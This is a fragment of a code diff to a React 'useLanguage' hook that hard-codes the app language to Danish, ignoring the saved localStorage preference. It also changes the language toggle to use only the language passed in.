     ok: "OK"
   }
 };
 
 export const useLanguage = () => {
   const [language, setLanguage] = useState(() => {
-    return localStorage.getItem('appLanguage') || 'en';
+    // FORCE DANISH - ignore localStorage completely
+    return 'da';
   });
 
   const toggleLanguage = (lang) => {
-    const newLanguage = lang || (language === 'en' ? 'cz' : 'en');
+    const newLanguage = lang;
     setLanguage(newLanguage);
     localStorage.setItem('appLanguage', newLanguage);
     window.dispatchEvent(new CustomEvent('languageChange', { detail: newLanguage }));
